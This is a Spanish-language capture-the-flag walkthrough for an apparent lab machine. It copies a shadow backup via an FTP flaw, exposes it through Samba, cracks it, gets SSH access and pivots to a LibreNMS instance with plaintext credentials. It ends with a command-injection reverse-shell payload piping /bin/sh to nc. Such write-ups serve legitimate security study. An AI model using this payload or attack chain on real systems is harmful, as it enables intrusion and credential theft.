____________
Tags: 
____________

# RECONOCIMIENTO

**nmap

![[Pasted image 20250507120731.png]]

![[Pasted image 20250507120928.png]]
________
**Puerto 21

![[Pasted image 20250507121159.png]]

vemos que la versión 1.3.5 tiene una vulnerabilidades como remote command execution y copia de archivos
_____________
**Puerto 80

![[Pasted image 20250507122750.png]]

*FUZZING

![[Pasted image 20250507122910.png]]

![[Pasted image 20250507123457.png]]

por mucho que fuzzeemos no vamos a encontrar nada
_____

**Servicio Samba

![[Pasted image 20250507123650.png]]

![[Pasted image 20250507124556.png]]

![[Pasted image 20250507134357.png]]

en el documento **log.txt** que hemos descargado de el servicio samba encontramos lo siguiente

**backup** del /etc/shadow que igual podemos copiar con la vulnerabilidad del puerto ftp

![[Pasted image 20250507134834.png]]

tambien podemos ver cual es el path del directorio compartido con samba ***/home/aeolus/share**

![[Pasted image 20250507135105.png]]

# EXPLOTACION

podemos intentar copiar el backup de /etc/shadow a el directorio compartido con samba

![[Pasted image 20250507140009.png]]

parece que se ha copiado en el directorio compartido, ahora descargamos otra vez el contenido de este directorio

![[Pasted image 20250507140229.png]]

![[Pasted image 20250507140301.png]]

contenido del **shadow.bak**

![[Pasted image 20250507140330.png]]

crackeo de los hashes con john the reeper


![[Pasted image 20250507140719.png]]


podemos intentar con estas credenciales logearnos por el servicio ssh 

![[Pasted image 20250507140835.png]]

se consiguio acceso por el servicio ssh

# ESCALADA DE PRIVILEGIOS

Hacemos el reconocimiento de la maquina básico

```bash
sudo -l
```

```bash
find / -perm -4000 2>/dev/null
```

```bash
getcap -r / 2>/dev/null
```

```bash
ss -tuln
```

![[Pasted image 20250508103131.png]]

lo unico interesante que encontramos es el puerto 8080 abierto asique vamos a ver que hay haciendo un remote port forwarding por ssh ya que tenemos acceso a la maquina por este

![[Pasted image 20250508103824.png]]

página web que corre por el puerto 8080

![[Pasted image 20250508104457.png]]

se puede obtener acceso con las credenciales *aeolus*::*sergioteamo*

buscamos en la base de datos de searchsploit a ver si hay vulnerabilidades en librenms y encontramos unas cuantas

![[Pasted image 20250508112649.png]]

probamos con la vulnerabilidad remote code execution 

analizando el script vemos que desde la pagina principal con la ruta /addhost podemos mandar un payload en el parametro community donde {0}{1} son rhost y rport

```payload
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #
```

![[Pasted image 20250508113303.png]]

